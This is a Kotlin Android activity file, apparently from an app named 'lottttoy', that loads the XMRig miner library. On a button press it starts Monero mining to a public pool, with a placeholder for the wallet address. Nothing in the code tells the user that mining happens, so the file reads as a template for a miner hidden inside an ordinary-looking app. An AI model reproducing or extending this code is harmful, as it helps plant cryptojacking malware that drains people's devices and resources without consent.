package com.lottttoy

import android.os.Bundle
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    external fun startMining(poolUrl: String, wallet: String)

    companion object {
        init {
            System.loadLibrary("xmrig")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val button = findViewById<Button>(R.id.button)
        button.setOnClickListener {
            startMining("pool.moneroocean.stream:3333", "YOUR_WALLET_ADDRESS_HERE")
        }
    }
}
